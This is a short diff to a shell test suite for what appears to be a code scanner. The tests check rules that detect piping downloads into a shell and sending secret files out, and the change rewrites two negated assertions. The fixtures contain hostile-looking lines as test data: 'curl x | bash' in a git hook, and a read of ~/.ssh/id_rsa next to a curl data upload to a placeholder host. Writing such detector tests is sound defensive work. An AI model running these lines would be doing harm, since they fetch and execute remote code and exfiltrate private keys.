@@ -665,7 +665,8 @@ has() { echo "$output" | jq -e --arg r "$1" '.findings[] | select(.rule==$r)' >/
 @test "VS004 stays quiet on a shell tail with no fetcher in its segment" {
   printf 'echo hi | sudo -E bash\nls | node\n' > "$D/a.sh"
   run scan
-  ! has VS004
+  run has VS004
+  [ "$status" -ne 0 ]
 }
 @test "VS007 sees a curl data flag on a continuation line" {
   printf 'import os\nopen(os.path.expanduser("~/.ssh/id_rsa"))\n# curl http://x.invalid \\\n   -d @f\n' > "$D/a.py"
@@ -717,5 +718,6 @@ print(f('VS004', 'a/README.md'), f('VS004', 'a/x.TXT'), f('VS004', 'a/install.sh
   echo 'curl x | bash' > "$BATS_TEST_TMPDIR/outside/pre-commit"
   ln -s "$BATS_TEST_TMPDIR/outside" "$D/.git/hooks"
   run scan
-  ! has VS004
+  run has VS004
+  [ "$status" -ne 0 ]
 }
